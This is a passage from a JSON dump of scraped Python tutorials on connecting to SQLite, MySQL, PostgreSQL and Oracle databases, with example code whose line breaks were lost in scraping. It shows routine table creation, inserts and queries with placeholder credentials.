1987)]\r\nNote: This piece of code may not work on online interpreters, due to permission privileges to create/write database.executemany()It is often the case when, large amount of data has to be inserted into database from Data Files(for simpler case take Lists, arrays). It would be simple to iterate the code many a times than write every time, each line into database. But the use of loop would not be suitable in this case, the below example shows why. Syntax and use of executemany() is explained below and how it can be used like a loop.import sqlite3\u00a0\u00a0# Connection with the DataBase# 'library.db'connection = sqlite3.connect(\"library.db\")cursor = connection.cursor()\u00a0\u00a0# SQL piece of code Executedcursor.execute(\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CREATE TABLE book(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0author,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0published);\"\"\")\u00a0\u00a0\u00a0List = [('A', 'B', 2008), ('C', 'D', 2008),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0('E', 'F', 2010)]\u00a0\u00a0\u00a0connection. executemany(\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0INSERT INTO\u00a0\u00a0\u00a0\u00a0\u00a0book(title, author, published)\u00a0\u00a0\u00a0\u00a0\u00a0VALUES (?, ?, ?)\"\"\", List)\u00a0\u00a0sql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SELECT * FROM book;\"\"\"cursor.execute(sql)result = cursor.fetchall()for x in result:\u00a0\u00a0\u00a0\u00a0print(x)\u00a0\u00a0# Changes saved into databaseconnection.commit()\u00a0\u00a0# Connection closed(broken)\u00a0# with DataBaseconnection.close()Output:\r\nTraceback (most recent call last):\r\n  File \"C:/Users/GFG/Desktop/SQLITE3.py\", line 16, in \r\n    List[2][3] =[['A', 'B', 2008], ['C', 'D', 2008], ['E', 'F', 2010]]\r\nNameError: name 'List' is not defined\r\nThe use of executemany(), can make the piece of code functional.import sqlite3\u00a0\u00a0\u00a0# Connection with the DataBase# 'library.db'connection = sqlite3.connect(\"library.db\")cursor = connection.cursor()\u00a0\u00a0\u00a0# SQL piece of code Executedcursor.execute(\"\"\"\u00a0\u00a0\u00a0\u00a0CREATE TABLE book(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0author,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0published);\"\"\")\u00a0\u00a0\u00a0List = [('A', 'B', 2008), ('C', 'D', 2008),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0('E', 'F', 2010)]\u00a0\u00a0\u00a0connection. executemany(\"\"\"\u00a0\u00a0\u00a0\u00a0INSERT INTO\u00a0\u00a0\u00a0\u00a0\u00a0book(title, author, published)\u00a0\u00a0\u00a0\u00a0\u00a0VALUES (?, ?, ?)\"\"\", List)\u00a0\u00a0\u00a0sql = \"\"\"SELECT * FROM book;\"\"\"cursor.execute(sql)result = cursor.fetchall()for x in result:\u00a0\u00a0\u00a0\u00a0print(x)\u00a0\u00a0\u00a0# Changes saved into databaseconnection.commit()\u00a0\u00a0\u00a0# Connection closed(broken)# with DataBaseconnection.close()Output:\r\n('A', 'B', 2008)\r\n('C', 'D', 2008)\r\n('E', 'F', 2010)\r\nFetch Large Dataimport sqlite3\u00a0\u00a0# Connection created with the# database using sqlite3.connect()connection = sqlite3.connect(\"company.db\")cursor = connection.cursor()\u00a0\u00a0# Create Table command executedsql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CREATE TABLE employee (\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ID INTEGER PRIMARY KEY,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fname VARCHAR(20),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lname VARCHAR(30),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0gender CHAR(1),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dob DATE);\"\"\"cursor.execute(sql)\u00a0\u00a0# Single Tuple insertedsql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0INSERT INTO employee\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0VALUES (1007, \"Will\", \"Olsen\", \"M\", \"24-SEP-1865\");\"\"\"cursor.execute(sql)\u00a0\u00a0# Multiple Rows insertedList = [(1008, 'Rkb', 'Boss', 'M', \"27-NOV-1864\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(1098, 'Sak', 'Rose', 'F', \"27-DEC-1864\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(1908, 'Royal', 'Bassen', \"F\", \"17-NOV-1894\")]\u00a0\u00a0connection. executemany(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"INSERT INTO employee VALUES (?, ?, ?, ?, ?)\", List)\u00a0\u00a0print(\"Method-1\\n\")\u00a0\u00a0# Multiple Rows fetched from# the Databasefor row in connection.execute('SELECT * FROM employee ORDER BY ID'):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (row)\u00a0\u00a0print(\"\\nMethod-2\\n\")\u00a0\u00a0# Method-2 to fetch multiple# rowssql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SELECT * FROM employee ORDER BY ID;\"\"\"\u00a0\u00a0cursor.execute(sql)result = cursor.fetchall()\u00a0\u00a0for x in result:\u00a0\u00a0\u00a0\u00a0print(x)\u00a0\u00a0connection.commit()connection.close()Output:\r\nMethod-1\r\n\r\n(1007, 'Will', 'Olsen', 'M', '24-SEP-1865')\r\n(1008, 'Rkb', 'Boss', 'M', '27-NOV-1864')\r\n(1098, 'Sak', 'Rose', 'F', '27-DEC-1864')\r\n(1908, 'Royal', 'Bassen', 'F', '17-NOV-1894')\r\n\r\nMethod-2\r\n\r\n(1007, 'Will', 'Olsen', 'M', '24-SEP-1865')\r\n(1008, 'Rkb', 'Boss', 'M', '27-NOV-1864')\r\n(1098, 'Sak', 'Rose', 'F', '27-DEC-1864')\r\n(1908, 'Royal', 'Bassen', 'F', '17-NOV-1894')\r\nNote: This piece of code may not work on online interpreters, due to permission privileges to create/write database.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d62db4ffe3219672885b18dd20ce0d87",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, we will see how one can insert the user data using variables.\u00a0Here, we are using the sqlite module to work on a database but before that, we need to import that package.\u00a0\u00a0import sqlite3To see the operation on a database level just download the SQLite browser database.Note: For the demonstration, we have used certain values but you can take input instead of those sample values.Steps to create and Insert variables in databaseCode #1: Create the database\u00a0Python3conn = sqlite3.connect('pythonDB.db')c = conn.cursor()Explanation:\u00a0We have initialised the database pythonDB.py. This instruction will create the database if the database doesn\u2019t exist. If the database having the same name as defined exist than it will move further. In the second statement, we use a method of sqlite3 named cursor(), this help you to initiate the database as active.Cursors are created by the connection cursor() method, they are bound to the connection for the entire lifetime and all the commands are executed in the context of the database session wrapped by the connection.\u00a0\u00a0Code #2: Create table\u00a0Python3def create_table():\u00a0\u00a0\u00a0\u00a0c.execute('CREATE TABLE IF NOT EXISTS RecordONE (Number REAL, Name TEXT)')Explanation:\u00a0We have created a function create_table. This will help you to create table if not exist, as written in the query for SQLite database. As we have initiated the table name by RecordONE. After that we pass as many parameters as we want, we just need to give an attribute name along with its type, here, we use REAL and Text.\u00a0\u00a0Code #3: Inserting into table\u00a0Python3def data_entry():\u00a0\u00a0\u00a0\u00a0number = 1234\u00a0\u00a0\u00a0\u00a0name = \"GeeksforGeeks\"\u00a0\u00a0\u00a0\u00a0c.execute(\"INSERT INTO RecordONE (Number, Name) VALUES(?, ?)\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(number, name))\u00a0\u00a0\u00a0\u00a0\u00a0conn.commit()Explanation:\u00a0Another function called data_entry. We are trying to add the values into the database with the help of user input or by variables. We use the execute() method to execute the query. Then use the commit() method to save the changes you have done above.\u00a0\u00a0Code #4: Method calling and Close the connection.\u00a0Python3create_table()data_entry()\u00a0c.close()conn.close()Explanation:\u00a0We normally use the method call, also remember to close the connection and database for the next use if we want to write error-free code because without closing we can\u2019t open the connection again.Let\u2019s see the complete example now.\u00a0Example:\u00a0Python3import sqlite3\u00a0conn = sqlite3.connect('pythonDB.db')c = conn.cursor()\u00a0def create_table():\u00a0\u00a0\u00a0\u00a0c.execute('CREATE TABLE IF NOT EXISTS RecordONE (Number REAL, Name TEXT)')\u00a0def data_entry():\u00a0\u00a0\u00a0\u00a0number = 1234\u00a0\u00a0\u00a0\u00a0name = \"GeeksforGeeks\"\u00a0\u00a0\u00a0\u00a0c.execute(\"INSERT INTO RecordONE (Number, Name) VALUES(?, ?)\", (number, name))\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0create_table()data_entry()\u00a0c.close()conn.close()Output:\u00a0\u00a0Inserting one more value using data_entry() method.\u00a0\u00a0Python3def data_entry():\u00a0\u00a0\u00a0\u00a0number = 4321\u00a0\u00a0\u00a0\u00a0name = \"Author\"\u00a0\u00a0\u00a0\u00a0c.execute(\"INSERT INTO RecordONE (Number, Name) VALUES(?, ?)\", (number, name))\u00a0\u00a0\u00a0\u00a0conn.commit()Output:\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "cdb46b624baf31a7b9f43bd49efaae6a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, I have discussed how to connect to MySQL database remotely using python. For any application, it is very important to store the database on a server for easy data access. It is quite complicated to connect to the database remotely because every service provider doesn\u2019t provide remote access to the MySQL database. Here I am using python\u2019s MySQLdb module for connecting to our database which is at any server that provides remote access.\u00a0What is MYSQLdb?MySQLdb is an interface for connecting to a MySQL database server from Python. It implements the Python Database API v2.0 and is built on top of the MySQL C API.\u00a0Packages to Install\u00a0mysql-connector-python\nmysql-pythonIf using anaconda\u00a0conda install -c anaconda mysql-python\nconda install -c anaconda mysql-connector-pythonelse\u00a0pip install MySQL-python\npip install MySQL-python-connectorImport-Package\u00a0import MYSQLdb\u00a0How to connect to a remote MySQL database using python?Before we start you should know the basics of SQL. Now let us discuss the methods used in this code:\u00a0connect(): This method is used for creating a connection to our database it has four arguments:Server NameDatabase User NameDatabase PasswordDatabase Namecursor(): This method creates a cursor object that is capable of executing SQL queries on the database.execute(): This method is used for executing SQL queries on the database. It takes a sql query( as string) as an argument.fetchone(): This method retrieves the next row of a query result set and returns a single sequence, or None if no more rows are available.close() : This method close the database connection.\u00a0Free remote mysql database providers:\u00a01.www.freemysqlhosting.net\u00a02.www.heliohost.org\u00a0\u00a0Python3'''This code would not be run on geeksforgeeks IDEbecause required moduleare not installed on IDE. Also this code requiresa remote MySQL databaseconnection with validHostname, Dbusername Password and Dbname'''\u00a0\u00a0# Module For Connecting To MySQL databaseimport MySQLdb\u00a0# Function for connecting to MySQL databasedef mysqlconnect():\u00a0\u00a0\u00a0\u00a0#Trying to connect\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0db_connection= MySQLdb.connect\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(\"Hostname\",\"dbusername\",\"password\",\"dbname\")\u00a0\u00a0\u00a0\u00a0# If connection is not successful\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Can't connect to database\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0\u00a0\u00a0\u00a0\u00a0# If Connection Is Successful\u00a0\u00a0\u00a0\u00a0print(\"Connected\")\u00a0\u00a0\u00a0\u00a0\u00a0# Making Cursor Object For Query Execution\u00a0\u00a0\u00a0\u00a0cursor=db_connection.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0# Executing Query\u00a0\u00a0\u00a0\u00a0cursor.execute(\"SELECT CURDATE();\")\u00a0\u00a0\u00a0\u00a0\u00a0# Above Query Gives Us The Current Date\u00a0\u00a0\u00a0\u00a0# Fetching Data\u00a0\u00a0\u00a0\u00a0m = cursor.fetchone()\u00a0\u00a0\u00a0\u00a0\u00a0# Printing Result Of Above\u00a0\u00a0\u00a0\u00a0print(\"Today's Date Is \",m[0])\u00a0\u00a0\u00a0\u00a0\u00a0# Closing Database Connection\u00a0\u00a0\u00a0\u00a0db_connection.close()\u00a0# Function Call For Connecting To Our Databasemysqlconnect()Connected\nToday's Date Is  2017-11-14Python3# Python code to illustrate and create a# table in databaseimport mysql.connector as mysql\u00a0# Open database connectiondb = mysql.connect(host=\"localhost\",user=\"root\",password=\"tiger\",database=\"python\")\u00a0cursor = db.cursor()\u00a0# Drop table if it already exist using execute()cursor.execute(\"DROP TABLE IF EXISTS EMPLOYEE\")\u00a0# Create table as per requirementsql = \"CREATE TABLE EMPLOYEE ( FNAME CHAR(20) NOT NULL, LNAME CHAR(20), AGE INT )\"\u00a0cursor.execute(sql) #table created\u00a0# disconnect from serverdb.close()Output:My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "62a291b0488499451fd2da97129df1dc",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "PostgreSQL is an open source object-relational database management system. It is well known for its reliability, robustness, and performance. PostgreSQL has a variety of libraries of API (Application programmable interface) that are available for a variety of popular programming languages such as Python. It provides a lot of features for Database management such as Views, Triggers, Indexes (using B-Trees), etc.There are several python modules that allow us to connect to and manipulate the database using PostgreSQL:Psycopg2pg8000py-postgresqlPyGreSQLPsycopg2 is one of the most popular python drivers for PostgreSQL. It is actively maintained and provides support for different versions of python. It also provides support for Threads and can be used in multithreaded applications. For these reasons, it is a popular choice for developers.In this article, we shall explore the features of PostgreSQl using psycopg2 by building a simple database management system in python.Installation:sudo pip3 install psycopg2 Note: if you are using Python2, use pip install instead of pip3Once psycopg has been installed in your system, we can connect to the database and execute queries in Python.Creating the databasebefore we can access the database in python, we need to create the database in postgresql. To create the database, follow the steps given below:Log in to PostgreSQL:sudo -u postgres psqlConfigure the password:\\passwordYou will then be prompted to enter the password. remember this as we will use it to connect to the database in Python.Create a database called \u201ctest\u201d. we will connect to this database.CREATE DATABASE test; Once the database and password have been configured, exit the psql server.Connecting to the databaseThe connect() method is used to establish connection with the database. It takes 5 parameters:database: The name of the database you are connecting touser: the username of your local systempassword: the password to log in to psqlhost: The host, which is set to localhost by defaultport: The port number which is 5432 by defaultconn = psycopg2.connect(\r\n            database=\"test\", \r\n            user = \"adith\", \r\n            password = \"password\", \r\n            host = \"localhost\", \r\n            port = \"5432\")Once the connection has been established, we can manipulate the database in python.The Cursor object is used to execute sql queries. we can create a cursor object using the connecting object (conn) cur = conn.cursor()  Using this object, we can make changes to the database that we are connected to.After you have executed all the queries, we need to disconnect from the connection. Not disconnecting will not cause any errors but it is generally considered a good practice to disconnect. conn.close() Executing queriesThe execute() method takes in one parameter, the SQL query to be executed. The SQL query is taken in the form of a string that contains the SQL statement. cur.execute(\"SELECT * FROM emp\") Fetching the dataOnce the query has been executed, the results of the query can be obtained using the fetchall() method. This method takes no parameters and returns the result of select queries. res = cur.fetchall() The result of the query is stored in the res variable.Putting it all togetherOnce we have created the database in PostgreSQL, we can access that database in python. We first create an emp table in the database called test with the schema: (id INTEGER PRIMARY KEY, name VARCHAR(10), salary INT, dept INT). Once the table is created without any errors, we insert values into the table.Once the values are inserted, we can query the table to select all the rows and display them to the user using the fetchall() function.# importing librariesimport psycopg2\u00a0\u00a0# a function to connect to# the database.def connect():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# connecting to the database called test\u00a0\u00a0\u00a0\u00a0# using the connect function\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn = psycopg2.connect(database =\"test\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0user = \"adith\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0password = \"password\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0host = \"localhost\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0port = \"5432\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# creating the cursor object\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = conn.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except (Exception, psycopg2.DatabaseError) as error:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"Error while creating PostgreSQL table\", error)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# returing the conn and cur\u00a0\u00a0\u00a0\u00a0# objects to be used later\u00a0\u00a0\u00a0\u00a0return conn, cur\u00a0\u00a0\u00a0\u00a0# a function to create the\u00a0# emp table.def create_table():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# connect to the database.\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the test database contains a table called emp\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the schema : (id INTEGER PRIMARY KEY,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# name VARCHAR(10), salary INT, dept INT)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# create the emp table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('CREATE TABLE emp (id INT PRIMARY KEY, name VARCHAR(10),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0salary INT, dept INT)')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the commit function permanently\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# saves the changes made to the database\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the rollback() function can be used if\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# there are any undesirable changes and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# it simply undoes the changes of the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# previous query\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# a function to insert data# into the emp tabledef insert_data(id = 1, name = '', salary = 1000, dept = 1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inserting values into the emp table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('INSERT INTO emp VALUES(%s, %s, %s, %s)',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(id, name, salary, dept))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as e:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error', e)\u00a0\u00a0\u00a0\u00a0# commiting the transaction.\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0\u00a0\u00a0\u00a0# a function to fetch the data\u00a0# from the tabledef fetch_data():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# select all the rows from emp\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('SELECT * FROM emp')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error !')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the result in data\u00a0\u00a0\u00a0\u00a0data = cur.fetchall()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# return the result\u00a0\u00a0\u00a0\u00a0return data\u00a0\u00a0# a function to print the datadef print_data(data):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Query result: ')\u00a0\u00a0\u00a0\u00a0print()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# iterating over all the\u00a0\u00a0\u00a0\u00a0\u00a0# rows in the table\u00a0\u00a0\u00a0\u00a0for row in data:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing the columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('id: ', row[0])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('name: ', row[1])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('salary: ', row[2])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('dept: ', row[3])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('----------------------------------')\u00a0\u00a0# function to delete the tabledef delete_table():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# delete the table\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('DROP TABLE emp')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as e:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error', e)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0\u00a0\u00a0\u00a0# driver functionif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# create the table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0create_table()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inserting some values\u00a0\u00a0\u00a0\u00a0insert_data(1, 'adith', 1000, 2)\u00a0\u00a0\u00a0\u00a0insert_data(2, 'tyrion', 100000, 2)\u00a0\u00a0\u00a0\u00a0insert_data(3, 'jon', 100, 3)\u00a0\u00a0\u00a0\u00a0insert_data(4, 'daenerys', 10000, 4)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# getting all the rows\u00a0\u00a0\u00a0\u00a0data = fetch_data()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing the rows\u00a0\u00a0\u00a0\u00a0print_data(data)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# deleting the table\u00a0\u00a0\u00a0\u00a0# once we are done with\u00a0\u00a0\u00a0\u00a0# the program\u00a0\u00a0\u00a0\u00a0delete_table()Output :My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "390cd89a5c86da24f5768436057406e6",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Sometimes as part of programming, we required to work with the databases because we want to store a huge amount of information so we use databases, such as Oracle, MySQL, etc. So In this article, we will discuss the connectivity of Oracle database using Python. This can be done through the module name cx_Oracle.\u00a0Oracle Database\u00a0For communicating with any database through our Python program we require some connector which is nothing but the cx_Oracle module.For installing cx-Oracle :\u00a0If you are using Python >= 3.6 use the below command in Linux: \u2013pip install cx-OracleIf you are using Python >= 3.6 use the below command in Windows: \u2013py -m pip install cx-OracleBy this command, you can install cx-Oracle package but it is required to install Oracle database first on your PC.\u00a0Import database specific module\u00a0Ex. import cx_Oracleconnect(): Now Establish a connection between the Python program and Oracle database by using connect() function.\u00a0\u00a0con = cx_Oracle.connect('username/password@localhost')cursor(): To execute a SQL query and to provide results some special object is required that is nothing but cursor() object.\u00a0cursor = cx_Oracle.cursor()execute/executemany method :\u00a0cursor.execute(sqlquery) \u2013 \u2013 \u2013 -> to execute a single query.\u00a0cursor.executemany(sqlqueries) \u2013 \u2013 \u2013 -> to execute a single query with multiple bind variables/place holders.commit(): For DML(Data Manipulation Language) queries that comprise operations like update, insert, delete. We need to commit() then only the result reflects in the database.fetchone(), fetchmany(int), fetchall():fetchone() : This method is used to fetch one single row from the top of the result set.fetchmany(int): This method is used to fetch a limited number of rows based on the argument passed in it.fetchall() : This method is used to fetch all rows from the result set.close(): After all done it is mandatory to close all operations.\u00a0cursor.close()\ncon.close()Execution of SQL statement:\u00a01. Creation of tablePython3# importing moduleimport cx_Oracle\u00a0# Create a table in Oracle databasetry:\u00a0\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0\u00a0\u00a0\u00a0print(con.version)\u00a0\u00a0\u00a0\u00a0\u00a0# Now execute the sqlquery\u00a0\u00a0\u00a0\u00a0cursor = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0# Creating a table employee\u00a0\u00a0\u00a0\u00a0cursor.execute(\"create table employee(empid integer primary key, name varchar2(30), salary number(10, 2))\")\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Table Created successfully\")\u00a0except cx_Oracle.DatabaseError as e:\u00a0\u00a0\u00a0\u00a0print(\"There is a problem with Oracle\", e)\u00a0# by writing finally if any error occurs# then also we can close the all database operationfinally:\u00a0\u00a0\u00a0\u00a0if 